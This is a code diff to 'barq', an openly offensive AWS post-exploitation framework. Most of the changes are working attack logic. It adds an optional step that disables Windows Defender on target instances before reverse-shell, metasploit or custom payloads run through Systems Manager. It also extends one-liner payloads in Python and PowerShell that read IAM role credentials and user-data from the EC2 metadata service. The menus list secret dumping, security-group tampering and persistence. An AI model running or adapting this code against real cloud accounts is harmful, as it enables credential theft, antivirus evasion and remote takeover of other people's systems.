@@ -91,7 +91,9 @@ def start():
     signal.signal(signal.SIGINT, signal.default_int_handler)
     f = Figlet(font='slant')
     args = Args()
-    puts(color(f.renderText('barq Cloud Post Exploitation framework by @Voulnet'),'green'))
+    puts(color(asciilogo,'blue'))
+
+    puts(color("barq cloud post exploitation framework by Mohammed Aldoub @Voulnet","green"))
 
     global loot_creds
     global ec2instances
@@ -395,7 +397,7 @@ def run_threaded_linux_command(mysession, target, action, payload):
                 commandx['output'] = result['StandardOutputContent']
                 command_invocations['commands'][index] = commandx
 
-def run_threaded_windows_command(mysession, target, action, payload):
+def run_threaded_windows_command(mysession, target, action, payload, disableav):
     """
     Thread-enabled function to run a Systems Manager command on a running Windows instance.
     It actually calls three commands: Disable windows defender, run the payload, then enable Windows Defender.
@@ -419,23 +421,24 @@ def run_threaded_windows_command(mysession, target, action, payload):
     ssmclient = mysession.client('ssm',region_name=target['region'])
     instanceid = target['id']
     #stage1 disable windows defender.
-    logger.error("inside run_threaded_windows_command for %s, before line: %s" % (target['id'], 'disable_windows_defender'))
-    response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[disable_windows_defender()]})
-    commandid = response['Command']['CommandId']
+    if disableav:
+        logger.error("inside run_threaded_windows_command for %s, before line: %s" % (target['id'], 'disable_windows_defender'))
+        response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[disable_windows_defender()]})
+        commandid = response['Command']['CommandId']
+        #############
+        time.sleep(10)
+        logger.error("inside run_threaded_windows_command for %s, before line: %s" % (target['id'], 'get_command_invocation 1'))
+        try:
+            result = ssmclient.get_command_invocation(CommandId=commandid,InstanceId=instanceid)
+        except:
+            pass
     #############
-    time.sleep(10)
-    logger.error("inside run_threaded_windows_command for %s, before line: %s" % (target['id'], 'get_command_invocation 1'))
-    try:
-        result = ssmclient.get_command_invocation(CommandId=commandid,InstanceId=instanceid)
-    except:
-        pass
-    #############
-    success, result = wait_for_threaded_command_invocation(commandid,instanceid, target['region'])
-    logger.error("inside run_threaded_windows_command for %s, after line: %s" % (target['id'], 'wait_for_threaded_command_invocation 1'))
-    logger.error("success equals: %s" %success)
-    if not success:
-        logger.error('aborting commands for id %s' %target['id'])
-        return False
+        success, result = wait_for_threaded_command_invocation(commandid,instanceid, target['region'])
+        logger.error("inside run_threaded_windows_command for %s, after line: %s" % (target['id'], 'wait_for_threaded_command_invocation 1'))
+        logger.error("success equals: %s" %success)
+        if not success:
+            logger.error('aborting commands for id %s' %target['id'])
+            return False
     #stage2 run payload
     time.sleep(3)
     logger.error(
@@ -465,6 +468,7 @@ def run_threaded_windows_command(mysession, target, action, payload):
                     commandx['state'] = 'failed'
                     commandx['error'] = result['StandardErrorContent']
                     command_invocations['commands'][index] = commandx
+                    success = False
                     break
     if result['Status'] == 'Success':
         logger.error(
@@ -474,23 +478,25 @@ def run_threaded_windows_command(mysession, target, action, payload):
                 commandx['state'] = 'success'
                 commandx['output'] = result['StandardOutputContent']
                 command_invocations['commands'][index] = commandx
+                success = True
                 break
 
     #################
     if not success:
         logger.error("inside run_threaded_windows_command for %s, failed in running payload" % (target['id']))
     #stage3 enable windows defender.
-    time.sleep(30)
-    logger.error("inside run_threaded_windows_command for %s, before enable_windows_defender" % (target['id']))
-    response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[enable_windows_defender()]})
-    commandid = response['Command']['CommandId']
-    success, result = wait_for_threaded_command_invocation(commandid,instanceid,target['region'])
-    logger.error("inside run_threaded_windows_command for %s, after enable_windows_defender, success: %s" % (target['id'], success))
-    if not success:
-        return False
+    if disableav:
+        time.sleep(30)
+        logger.error("inside run_threaded_windows_command for %s, before enable_windows_defender" % (target['id']))
+        response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[enable_windows_defender()]})
+        commandid = response['Command']['CommandId']
+        success, result = wait_for_threaded_command_invocation(commandid,instanceid,target['region'])
+        logger.error("inside run_threaded_windows_command for %s, after enable_windows_defender, success: %s" % (target['id'], success))
+        if not success:
+            return False
     return True
     
-def run_windows_command(ssmclient, instanceid,action,payload):
+def run_windows_command(ssmclient, instanceid,action,payload, disableav):
     """
     Run a Systems Manager command on a running Windows instance.
     It actually calls three commands: Disable windows defender, run the payload, then enable Windows Defender.
@@ -502,13 +508,14 @@ def run_windows_command(ssmclient, instanceid,action,payload):
     """
     time.sleep(3)
     #stage1 disable windows defender.
-    puts(color('[..] Disabling Windows Defender momentarily...'))
-    response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[disable_windows_defender()]})
-    commandid = response['Command']['CommandId']
-    success, result = wait_for_command_invocation(ssmclient,commandid,instanceid)
-    if not success:
-        puts(color('[!] Could not disable Windows Defender... Stopping command invocation...'))
-        return False
+    if disableav:
+        puts(color('[..] Disabling Windows Defender momentarily...'))
+        response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[disable_windows_defender()]})
+        commandid = response['Command']['CommandId']
+        success, result = wait_for_command_invocation(ssmclient,commandid,instanceid)
+        if not success:
+            puts(color('[!] Could not disable Windows Defender... Stopping command invocation...'))
+            return False
     #stage2 run payload
     puts(color('[..] Running payload...'))
     time.sleep(3)
@@ -519,18 +526,19 @@ def run_windows_command(ssmclient, instanceid,action,payload):
         puts(color('[!] Could not run payload... Stopping command invocation...'))
         return False
     #stage3 enable windows defender.
-    time.sleep(30)
-    puts(color('[..] Enabling Windows Defender again....'))
-    response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[enable_windows_defender()]})
-    commandid = response['Command']['CommandId']
-    success, result = wait_for_command_invocation(ssmclient,commandid,instanceid)
-    if not success:
-        puts(color('[!] Could not enable Windows Defender... Stopping command invocation...'))
-        return False
+    if disableav:
+        time.sleep(30)
+        puts(color('[..] Enabling Windows Defender again....'))
+        response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[enable_windows_defender()]})
+        commandid = response['Command']['CommandId']
+        success, result = wait_for_command_invocation(ssmclient,commandid,instanceid)
+        if not success:
+            puts(color('[!] Could not enable Windows Defender... Stopping command invocation...'))
+            return False
     return True
 
-PRINT_EC2_METADATA_CMD = "python -c \"import requests, json; b = 'http://169.254.169.254/latest/';m='meta-data/';roleid = requests.get(b+m+'iam/security-credentials/').text; print '{RoleID: %s,'%roleid;print 'Credentials: %s,'%(requests.get(b+m+'iam/security-credentials/%s'%roleid).text); print 'AMIID: %s,'%(requests.get(b+m+'ami-id').text); print 'PublicIP: %s,'%(requests.get(b+m+'public-ipv4').text);  print 'PublicHostname:%s,'%(requests.get(b+m+'public-hostname').text); print 'InstanceIdentityDocument: %s}'%(requests.get(b+'dynamic/instance-identity/document').text);\""
-PRINT_EC2_METADATA_PSH = "$b = 'http://169.254.169.254/latest/';$m='meta-data/';$roleid = (Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'iam/security-credentials/')).Content;echo ('--->Role ID: '+$roleid);echo ('--->Credentials: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'iam/security-credentials/'+$roleid)).Content);echo ('--->AMI-ID: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'ami-id')).Content);echo ('--->Public IP: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'public-ipv4')).Content);echo ('--->Public Hostname: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'public-hostname')).Content);echo ('--->Instance Identity Document: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+'dynamic/instance-identity/document')).Content);"
+PRINT_EC2_METADATA_CMD = "python -c \"import requests, json; b = 'http://169.254.169.254/latest/';m='meta-data/';roleid = requests.get(b+m+'iam/security-credentials/').text; print '{RoleID: %s,'%roleid;print 'Credentials: %s,'%(requests.get(b+m+'iam/security-credentials/%s'%roleid).text); print 'AMIID: %s,'%(requests.get(b+m+'ami-id').text); print 'PublicIP: %s,'%(requests.get(b+m+'public-ipv4').text);  print 'PublicHostname:%s,'%(requests.get(b+m+'public-hostname').text); print 'InstanceIdentityDocument: %s,'%(requests.get(b+'dynamic/instance-identity/document').text);print 'UserData:%s}'%(requests.get(b+'user-data/').text);\""
+PRINT_EC2_METADATA_PSH = "$b = 'http://169.254.169.254/latest/';$m='meta-data/';$roleid = (Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'iam/security-credentials/')).Content;echo ('--->Role ID: '+$roleid);echo ('--->Credentials: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'iam/security-credentials/'+$roleid)).Content);echo ('--->AMI-ID: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'ami-id')).Content);echo ('--->Public IP: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'public-ipv4')).Content);echo ('--->Public Hostname: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+$m+'public-hostname')).Content);echo ('--->Instance Identity Document: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+'dynamic/instance-identity/document')).Content);echo ('--->UserData: '+($instanceId = Invoke-WebRequest -UseBasicParsing -Uri ($b+'user-data/')));"
 
 
 
@@ -553,6 +561,7 @@ def shellscript_options(OS):
     :param OS: Target instance OS.
     :return: Tuple of payload and action (AWS SSM DocumentName)
     """
+    disableav = False
     puts(color('[*] Choose your payload:'))
     if OS == 'linux':
         payload_options = [{'selector':'1','prompt':'cat /etc/passwd','return':'cat /etc/passwd'},
@@ -561,7 +570,7 @@ def shellscript_options(OS):
 {'selector':'4', 'prompt':'reverse shell to external host', 'return':'reverseshell'},
 {'selector':'5','prompt':'whoami','return':'whoami'},
 {'selector':'6','prompt':'metasploit','return':'msf'},
-{'selector':'7','prompt':'print EC2 metadata','return':PRINT_EC2_METADATA_CMD},
+{'selector':'7','prompt':'print EC2 metadata and userdata (custom init script)','return':PRINT_EC2_METADATA_CMD},
 {'selector':'8','prompt':'Visit a URL from inside EC2 instance','return':'URL'}]
         action = 'AWS-RunShellScript'
     else:
@@ -569,7 +578,7 @@ def shellscript_options(OS):
 {'selector':'2', 'prompt':'reverse shell to external host', 'return':'reverseshell'},
 {'selector':'3','prompt':'whoami','return':'whoami'},
 {'selector':'4','prompt':'metasploit','return':'msf'},
-{'selector':'5','prompt':'print EC2 metadata','return':PRINT_EC2_METADATA_PSH},
+{'selector':'5','prompt':'print EC2 metadata and userdata (custom init script)','return':PRINT_EC2_METADATA_PSH},
 {'selector':'6','prompt':'Visit a URL from inside EC2 instance','return':'URL'}]
         action = 'AWS-RunPowerShellScript'
 
@@ -584,6 +593,7 @@ def shellscript_options(OS):
             payload, action = reverseshell_options(remote_ip_host, remote_port, OS)
         elif payload == "msf":
             payload, action = metasploit_installed_options(remote_ip_host, remote_port, OS)
+        disableav = True
     elif payload == 'URL':
         puts(color('[*] Choose the URL to visit from inside the EC2 instance:'))
         URL = prompt.query('URL: ', default="http://169.254.169.254/latest/")
@@ -592,7 +602,7 @@ def shellscript_options(OS):
             payload = "python -c \"import requests; print requests.get('%s').text;\"" %URL
         else:
             payload = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;" %URL
-    return payload,action
+    return payload,action, disableav
 
 def reverseshell_options(host,port, OS):
     """
@@ -823,7 +833,7 @@ def start_training_mode(caller):
         newinstance.wait_until_running()
         newinstance.reload()
         puts(color('[+] EC2 instance state is: %s'%newinstance.state))
-        payload,action = shellscript_options(OS)
+        payload,action, disableav = shellscript_options(OS)
 
         puts(color('[..] Sending the command "%s" to the running instance....'%payload))
         instanceid = newinstance.id
@@ -833,7 +843,7 @@ def start_training_mode(caller):
         else:
             puts(color('[..] Waiting for Windows EC2 instance to be ready... waiting for 2 minutes...'))
             time.sleep(120)
-            success = run_windows_command(ssmclient,instanceid, action, payload)
+            success = run_windows_command(ssmclient,instanceid, action, payload, disableav)
 #########
 #########
         puts(color('[+] Training mode done... Now terminating EC2 instance and deleting IAM role...'))
@@ -1302,7 +1312,7 @@ def ec2attacks(caller):
             go_to_menu(caller)
         
     puts(color('[*] EC2 Attack List:'))
-    attack_options = [{'selector':'1','prompt':'Download EC2 metadata','return':'metadata'},
+    attack_options = [{'selector':'1','prompt':'Download EC2 metadata and userdata (custom init script)','return':'metadata'},
         {'selector':'2', 'prompt':'Display a file', 'return':'printfile'},
         {'selector':'3','prompt':'Visit a URL from inside EC2 instance','return':'URL'},
         {'selector':'4','prompt':'metasploit','return':'msf'},
@@ -1337,6 +1347,7 @@ def attack_single_target(caller,target, attack):
     target_platform = ''
     target_state = ''
     target_region = ''
+    disableav = False
     for ins in ec2instances['instances']:
         if ins.get('id') == target:
             target_id = target
@@ -1361,6 +1372,7 @@ def attack_single_target(caller,target, attack):
             attack, action = reverseshell_options(remote_ip_host, remote_port, target_platform)
         elif attack == "msf":
             attack, action = metasploit_installed_options(remote_ip_host, remote_port, target_platform)
+        disableav = True
     elif attack == 'URL':
         puts(color('[*] Choose the URL to visit from inside the EC2 instance:'))
         URL = prompt.query('URL: ', default="http://169.254.169.254/latest/")
@@ -1378,6 +1390,7 @@ def attack_single_target(caller,target, attack):
         attack = "cat %s" %filepath
     elif attack == "command":
         attack = prompt.query('Enter the full command to run: (bash for Linux - Powershell for Windows)', default="cat /etc/passwd")
+        disableav = True
 
     puts(colored.cyan('Sending the command "%s" to the target instance %s....'%(attack,target)))
     mysession = set_session_region(target_region)
@@ -1385,7 +1398,7 @@ def attack_single_target(caller,target, attack):
     if target_platform == 'linux':
         success = run_linux_command(ssmclient,target,action,attack)
     else:
-        success = run_windows_command(ssmclient,target, action, attack)        
+        success = run_windows_command(ssmclient,target, action, attack, disableav)
     return True
 
 def attack_multiple_targets(mysession,caller,targets, attack, linux, windows):
@@ -1404,9 +1417,10 @@ def attack_multiple_targets(mysession,caller,targets, attack, linux, windows):
     
     windowsaction = 'AWS-RunPowerShellScript'
     linuxaction = 'AWS-RunShellScript'
+    disableav = False
     if attack == "reverseshell" or attack == "msf":
         puts(colored.magenta('Make sure your shell listener tool can handle multiple simultaneous connections!'))
-
+        disableav = True
         if attack == "reverseshell":
             linuxattack, windowsattack = reverseshell_multiple_options(linux, windows)
         elif attack == "msf":
@@ -1427,7 +1441,7 @@ def attack_multiple_targets(mysession,caller,targets, attack, linux, windows):
     elif attack == "command":
         linuxattack = prompt.query('(Ignore if linux is not targeted)Enter the full bash command to run: ', default="whoami")
         windowsattack = prompt.query('(Ignore if Windows is not targeted)Enter the full Powershell command to run: ', default="whoami")
-
+        disableav = True
     logger.error("before running threaded attacks")
     for target in targets:
         if target['platform'] == 'linux' and linux and target.get('iam_profile','') != '' and linuxattack != '':
@@ -1439,7 +1453,7 @@ def attack_multiple_targets(mysession,caller,targets, attack, linux, windows):
         if target['platform'] == 'windows' and windows and target.get('iam_profile','') != '' and windowsattack != '':
             logger.error("running run_threaded_windows_command for %s" % target['id'])
             #run_threaded_windows_command(mysession,target,windowsaction,windowsattack)
-            windowsthread = Thread(target=run_threaded_windows_command, args=(mysession, target,windowsaction,windowsattack))
+            windowsthread = Thread(target=run_threaded_windows_command, args=(mysession, target,windowsaction,windowsattack,disableav))
             windowsthread.start()
             logger.error("after run_threaded_windows_command for %s" % target['id'])
         
@@ -1467,11 +1481,11 @@ def check_command_invocations(caller):
         puts(colored.green('command platform: %s'%command.get('platform')))
         puts(colored.green('command region: %s'%command.get('region') ))
         try:
-            puts(colored.green('command error: %s'%command.get('error','No errors')[0:1000]))
+            puts(colored.green('command error: %s'%command.get('error','No errors')[0:5000]))
         except:
             pass
         try:
-            puts(colored.green('command output: %s'%command.get('output', 'No output')[0:1000] ))
+            puts(colored.green('command output: %s'%command.get('output', 'No output')[0:5000] ))
         except:
             pass
             
@@ -1601,8 +1615,12 @@ def set_aws_creds(caller):
     try:
         regionresponse = ec2client.describe_regions()
     except Exception as e:
-        puts(color("[!] Error accessing AWS services. Double check your AWS keys and privileges."))
-        exit()
+        if "OptInRequired" in str(e):
+            puts(color("[!] OptInRequired Error: The keys are valid but you have a problem in your AWS account."
+                       "Your account may be under validation by AWS. Is it a new account?"))
+        else:
+            puts(color("[!] Error accessing AWS services. Double check your AWS keys, tokens, privileges and region."))
+        go_to_menu(caller)
     regions = regionresponse['Regions']
     region_table = PrettyTable(['Region'])
     possible_regions = []
@@ -1643,7 +1661,11 @@ def set_aws_creds_inline(aws_access_key_id,aws_secret_access_key,region_name,aws
     try:
         regionresponse = ec2client.describe_regions()
     except Exception as e:
-        puts(color("[!] Error accessing AWS services. Double check your AWS keys, tokens, privileges and region."))
+        if "OptInRequired" in str(e):
+            puts(color("[!] OptInRequired Error: The keys are valid but you have a problem in your AWS account."
+                       "Your account may be under validation by AWS. Is it a new account?"))
+        else:
+            puts(color("[!] Error accessing AWS services. Double check your AWS keys, tokens, privileges and region."))
         exit()
     regions = regionresponse['Regions']
     possible_regions = []
@@ -1690,20 +1712,20 @@ def main_help():
     """
     print(""" Main Help menu
             ================
-            help - print this menu
-            where - find where you are in the program
-            back - Go back to the previous menu
-            exit - Exit the program
-            setprofile - Set your AWS credentials
-            showprofile - Show your AWS credentials
-            showsecrets - Show credentials and secrets acquired from the target AWS account
-            training - Go to training mode            
-            dumpsecrets - Gather and dump credentials of EC2 in Secrets Manager and Parameter Store
-            attacksurface - Discover attack surface of target AWS account
-            addtosecgroups - Add IPs and ports to security groups
-            persistence - Add persistence and hide deeper
-            ec2instances - Go to EC2 instances menu
-            securitygroups - List all discovered Security Groups
+            help            - print this menu
+            where           - find where you are in the program
+            back            - Go back to the previous menu
+            exit            - Exit the program
+            setprofile      - Set your AWS credentials
+            showprofile     - Show your AWS credentials
+            showsecrets     - Show credentials and secrets acquired from the target AWS account
+            training        - Go to training mode            
+            dumpsecrets     - Gather and dump credentials of EC2 in Secrets Manager and Parameter Store
+            attacksurface   - Discover attack surface of target AWS account
+            addtosecgroups  - Add IPs and ports to security groups
+            persistence     - Add persistence and hide deeper
+            ec2instances    - Go to EC2 instances menu
+            securitygroups  - List all discovered Security Groups
             """)
     main_loop()
 
@@ -1727,13 +1749,13 @@ def training_help():
     """
     print(""" Training Help menu
             ================
-            help - print this menu
-            where - find where you are in the program
-            back - Go back to the previous menu
-            exit - Exit the program
-            setprofile - Set your AWS credentials
+            help        - print this menu
+            where       - find where you are in the program
+            back        - Go back to the previous menu
+            exit        - Exit the program
+            setprofile  - Set your AWS credentials
             showprofile - Show your AWS credentials
-            start - Start training mode
+            start       - Start training mode
 
             """)
     training_loop()
@@ -1757,20 +1779,20 @@ def instances_help():
     """
     print(""" EC2 instances Help menu
             ================
-            help - print this menu
-            where - find where you are in the program
-            back - Go back to the previous menu
-            exit - Exit the program
-            setprofile - Set your AWS credentials
-            showprofile - Show your AWS credentials
-            showsecrets - Show credentials and secrets acquired from the target AWS account
-            ec2attacks - Launch attacks against running EC2 instances
-            list - List all discovered EC2 instances
-            dumpsecrets - Gather and dump credentials of EC2 in Secrets Manager and Parameter Store
-            attacksurface - Discover attack surface of target AWS account
-            securitygroups - List all discovered Security Groups
-            commandresults - Check command results
-            instance - Get more details about an instance
+            help            - print this menu
+            where           - find where you are in the program
+            back            - Go back to the previous menu
+            exit            - Exit the program
+            setprofile      - Set your AWS credentials
+            showprofile     - Show your AWS credentials
+            showsecrets     - Show credentials and secrets acquired from the target AWS account
+            ec2attacks      - Launch attacks against running EC2 instances
+            list            - List all discovered EC2 instances
+            dumpsecrets     - Gather and dump credentials of EC2 in Secrets Manager and Parameter Store
+            attacksurface   - Discover attack surface of target AWS account
+            securitygroups  - List all discovered Security Groups
+            commandresults  - Check command results
+            instance        - Get more details about an instance
             """)
     instances_loop()
 
@@ -1787,4 +1809,65 @@ def instancecomplete(text, state):
                 return cmd
             else:
                 state -= 1
+
+
+
+asciilogo = """
+                                                                                                    
+                                                  .                                                 
+                                                 :y-                                                
+                                                :yy:                                                
+                                               /ys/:`                                               
+                                              /yo/::-                                               
+                                             /y+/::::`                                              
+                                            +y/+:::::-                                              
+                                           +s:+:::::::`                                             
+                                         `+s-+::::::::-                                             
+                                        `oo.o/:::::::-`                                             
+                                       `o+.o/::::::::                                               
+                                      `o/`s/::::::/o:                                               
+                                     `o:`s+::::::/sy`                                               
+                                    .o-`s+-----::+++..........`                                     
+                        `          .+.`so-------------------::`         .`                          
+                    ``.--`        .+``so-----:::::::::-----:-`          oys+-.`                     
+                `..---..`        ./ `ys----::/+++++oo/----:-            .:+yhhyo:.`                 
+            `.----.``           .: `ys:---::+oyssooo+----::....```          .-+shhyo/-`             
+       ``.----.``              .- `yh+++++ooooo+//::----:.   ``     `           `-/oyhhs+:``        
+     .----.`                  ..  :/::-..``      `-----:--:/+o/    `                 .:+ydhy:       
+     .----.`                 .`               `..-----/ssssss+   `.                 `.:oydhy:       
+       ``.----.`            `         ``.-:/+os/----:+ysssss+   .-              `-/oydhy+:.         
+           ``.----.``          `.--:/+ooossssy/----:+osssss+`  --           `-+shhhs/-`             
+                `..---..`   ````    `-ooooosyys+/::ossoooo+`  :-        `:oyddyo:.                  
+                    ``.--`           /oooosyyyysooosooooo+`  /-         shs+-`                      
+                                   `+ooooooooooooooooooo+` `+-          `                           
+                                  .oooooooooooooooooooo+` .o-                                       
+                                  .//////////yyyso+++++` -s-                                        
+                                             yys++++++` :s-                                         
+                                             oo++++++. /s-                                          
+                                            `/++++++.`+o.                                           
+                                           ./++++++.`oo.                                            
+                                           :////+/..so-                                             
+                                           ./////.:y+-                                              
+                                           `////-/y+-                                               
+                                            ://-+y+-                                                
+                                       
+                                            ./:oy+-                                                 
+                                            `/sy/-                                                  
+                                             oy/-                                                   
+                                             //-                                                    
+                         `--.                `-                                                     
+                         -dd/                                                                       
+                         -dd/`-:-`    `.----.`     `..``---`   `---``..                             
+                         -ddysyhdy:   :sooooys:    /yyossss/  -sysoosyy`                            
+                         -ddy` `ydh`  ..---:sys    /yy+`  `` `yyo` `syy`                            
+                         -dd+   odd. .oyyo++yyy    /yy.      .yy/   +yy`                            
+                         -ddy``.hdh  /yy:  `yyy    /yy.      `yys```syy`                            
+                         -hhsyyhhy-  .sys++osyy    /yy.       -syyossyy`                            
+                         `..``--.      ..-. ...    `..          .-. +yy`                            
+                                                                    +yy`                            
+                                                                    `..                             
+                                                                                                    
+"""
+
+
 start()
